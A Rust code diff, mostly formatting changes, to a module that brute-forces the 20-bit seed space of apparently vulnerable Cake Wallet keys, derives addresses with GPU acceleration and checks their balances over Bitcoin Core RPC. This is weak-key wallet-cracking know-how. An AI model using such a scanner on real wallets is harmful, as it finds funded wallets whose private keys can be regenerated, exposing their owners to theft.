@@ -1,3 +1,4 @@
+use crate::scans::gpu_solver::GpuSolver;
 use anyhow::Result;
 use bip39::Mnemonic;
 use bitcoin::bip32::{DerivationPath, Xpriv};
@@ -6,7 +7,6 @@ use bitcoin::{Address, Network};
 use bitcoincore_rpc::{Auth, Client, RpcApi};
 use std::io::Write;
 use std::str::FromStr;
-use crate::scans::gpu_solver::GpuSolver;
 
 /// Scans Cake Wallet vulnerable addresses (20-bit entropy) and checks balances via Bitcoin Core RPC
 /// Uses GPU acceleration for address generation
@@ -44,8 +44,11 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
     // 20 bits = 1,048,576 possibilities
     let max_entropy = 1 << 20;
 
-    println!("Scanning {} possible seeds with GPU acceleration...", max_entropy);
-    
+    println!(
+        "Scanning {} possible seeds with GPU acceleration...",
+        max_entropy
+    );
+
     let mut checked = 0;
     let mut found = 0;
     let start = std::time::Instant::now();
@@ -77,7 +80,7 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
         // Check each address via RPC
         for idx in 0..current_batch_size {
             let i = batch_start + idx;
-            
+
             let paths_and_addresses = [
                 (addresses_44[idx], "m/44'/0'/0'/0/0", "Legacy"),
                 (addresses_84[idx], "m/84'/0'/0'/0/0", "SegWit"),
@@ -88,7 +91,7 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
                 // Convert GPU address format to Bitcoin Address
                 // GPU returns addresses in a compact format, need to decode
                 let address_str = decode_address_from_gpu(&addr_bytes, path_type, network)?;
-                
+
                 if let Ok(address) = Address::from_str(&address_str) {
                     let checked_address = address.assume_checked();
                     // Check balance via RPC
@@ -148,7 +151,11 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
     }
 
     println!("\n\nScan complete!");
-    println!("Total checked: {} seeds x 3 paths = {} addresses", checked, checked * 3);
+    println!(
+        "Total checked: {} seeds x 3 paths = {} addresses",
+        checked,
+        checked * 3
+    );
     println!("Total found: {}", found);
 
     Ok(())
@@ -157,26 +164,30 @@ pub fn run(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
 /// Decode GPU address format to Bitcoin address string
 /// GPU returns addresses as base58-encoded strings in a 25-byte buffer
 #[allow(unused_variables)]
-fn decode_address_from_gpu(addr_bytes: &[u8; 25], _addr_type: &str, _network: Network) -> Result<String> {
+fn decode_address_from_gpu(
+    addr_bytes: &[u8; 25],
+    _addr_type: &str,
+    _network: Network,
+) -> Result<String> {
     // GPU kernels output base58-encoded addresses as null-terminated strings
     // The 25-byte buffer contains the ASCII string representation
     // Find the null terminator and convert to string
     let addr_str = std::str::from_utf8(addr_bytes)
         .unwrap_or("")
         .trim_end_matches('\0');
-    
+
     // Validate it's not empty
     if addr_str.is_empty() {
         return Err(anyhow::anyhow!("GPU returned empty address"));
     }
-    
+
     Ok(addr_str.to_string())
 }
 
 /// CPU-only fallback implementation (original code)
 fn run_cpu_only(rpc_url: &str, rpc_user: &str, rpc_pass: &str) -> Result<()> {
     println!("Running in CPU-only mode...");
-    
+
     let rpc = Client::new(
         rpc_url,
         Auth::UserPass(rpc_user.to_string(), rpc_pass.to_string()),
